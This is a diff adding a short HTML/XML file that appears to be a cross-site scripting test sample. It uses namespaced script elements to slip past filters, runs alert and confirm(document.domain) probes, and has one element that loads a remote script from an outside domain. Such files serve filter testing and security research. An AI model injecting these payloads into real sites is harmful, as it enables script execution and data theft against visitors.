@@ -1,0 +1,22 @@
+<html>
+	<head></head>
+	<body>
+		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+        <a:script xmlns:a="http://www.w3.org/1999/xhtml" src='https://cm2.pw'></a:script>
+		<info>
+		  <name>
+		    <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
+		  </name>
+		    <description>
+		      <value>Hello</value>
+		    </description>
+		    <url>
+		      <value>http://google.com</value>
+		    </url>
+		    <url>
+                <value><s>ssss</s></value>
+		    </url>
+
+		</info>
+	</body>
+</html>
